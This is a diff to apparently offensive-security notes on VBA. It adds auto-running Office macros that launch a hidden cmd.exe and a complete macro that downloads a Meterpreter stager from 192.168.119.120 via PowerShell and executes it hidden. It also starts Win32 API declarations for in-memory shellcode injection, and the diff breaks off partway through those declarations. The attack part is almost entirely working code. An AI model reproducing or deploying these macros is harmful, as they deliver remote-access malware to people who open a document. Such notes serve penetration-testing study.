@@ -7,9 +7,78 @@ metaLinks:
 
 # VBA
 
+<figure><img src="../../../.gitbook/assets/Screenshot 2026-04-24 at 1.52.46 in the afternoon.png" alt=""><figcaption></figcaption></figure>
+
+Macro to execute cmd from the Shell method
+
+```bash
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "cmd.exe"
+    Shell str, vbHide
+End Sub
+```
+
+Macro execute cmd from Windows Script Host
+
+```bash
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "cmd.exe"
+    CreateObject("Wscript.Shell").Run str, 0
+End Sub
+```
+
+#### Complete VBA macro to download Meterpreter executable and execute it
+
+```bash
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
+    Shell str, vbHide
+    Dim exePath As String
+    exePath = ActiveDocument.Path + "\msfstaged.exe"
+    Wait (2)
+    Shell exePath, vbHide
+
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
+```
+
 We will call Win32 APIs from Kernel32.dll: **VirtualAlloc**, **RtlMoveMemory**, and **CreateThread**. We can used it with Macro.
 
-```vba
+```bash
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
